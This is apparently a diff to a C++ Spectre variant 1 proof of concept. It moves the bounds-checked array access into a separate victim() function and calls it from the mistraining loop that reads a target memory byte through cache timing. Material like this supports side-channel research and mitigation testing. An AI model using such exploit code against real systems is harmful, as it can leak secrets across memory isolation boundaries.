@@ -115,6 +115,12 @@ public:
     array1_size = sizeof(array1);
   }
 
+  void victim(int x) {
+    if (x < array1_size) {
+      volatile uint8_t tmp = array2[array1[x] * CACHE_LINE_SIZE];
+    }
+  }
+
   /* Report best guess in value[0] and runner-up in value[1] */
   void readMemoryByte(const void* target_ptr, uint8_t value[2], int score[2]) {
     size_t malicious_x = (size_t)target_ptr - (size_t)array1;
@@ -143,9 +149,7 @@ public:
         x = training_x ^ (x & (malicious_x ^ training_x));
 
         /* Call the victim! */
-        if (x < array1_size) {
-          array2[array1[x] * CACHE_LINE_SIZE] = 0;
-        }
+        victim(x);
       }
 
       /* Time reads. Order is mixed up to prevent stride prediction */
